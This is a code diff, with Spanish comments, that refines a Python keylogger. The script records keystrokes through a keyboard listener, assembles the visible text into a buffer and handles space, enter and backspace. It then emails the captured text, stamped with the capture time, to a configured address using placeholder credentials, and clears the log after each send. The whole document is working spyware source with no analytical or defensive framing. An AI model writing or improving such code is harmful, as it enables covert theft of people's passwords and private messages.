@@ -9,15 +9,27 @@ carpeta_destino = 'Ruta_donde_quieres_que_se_guarde_lo_que_se_teclea'
 segundos_espera = 10
 timeout = time.time() + segundos_espera
 
+# Variable global para el texto tecleado
+texto_buffer = ''
+
 # Configurar logging
 logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
 
-# Registrar teclas
+# Registrar teclas (solo visibles)
 def on_press(key):
+    global texto_buffer
+
     try:
-        logging.info(str(key.char))
+        if key.char is not None:
+            texto_buffer += key.char  # Agregar carácter al buffer
     except AttributeError:
-        logging.info(str(key))
+        if key == keyboard.Key.space:
+            texto_buffer += ' '
+        elif key == keyboard.Key.enter:
+            texto_buffer += '\n'
+        elif key == keyboard.Key.backspace:
+            texto_buffer = texto_buffer[:-1]  # Eliminar el último carácter
+        # ignorar otras teclas especiales
 
 # Función de timeout
 def TimeOut():
@@ -25,22 +37,36 @@ def TimeOut():
 
 # Enviar por correo
 def EnviarEmail():
+    global texto_buffer
+
     with open(carpeta_destino, 'r+') as f:
+        contenido = texto_buffer.strip()
+
+        # Verificar si se presionaron teclas (el archivo no está vacío)
+        if contenido == '':
+            print("No se detectaron teclas. No se envía correo.")
+            return  # Salir de la función si no hay datos
+
         fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        data = f.read()
-        data = data.replace('Key.space', ' ')
-        data = data.replace('\n', '')
-        data = f"Mensaje capturado a las: {fecha}\n{data}"
-        print(data)
+        contenido = contenido.replace('Key.space', ' ')
+        contenido = contenido.replace('\n', '')
+        mensaje = f"Mensaje capturado a las: {fecha}\n{contenido}"
+
+        print(mensaje)
+
         crearEmail(
             user='tu_correo_electronico',
             passw='tu_contraseña_de_aplicación',
             recep='tu_correo_electronico',
             subj='Nueva captura: ' + fecha,
-            body=data
+            body=mensaje
         )
+
+        # Limpiar archivo después del envío
+        texto_buffer = ''
         f.seek(0)
         f.truncate()
+
 
 # Enviar correo
 def crearEmail(user, passw, recep, subj, body):
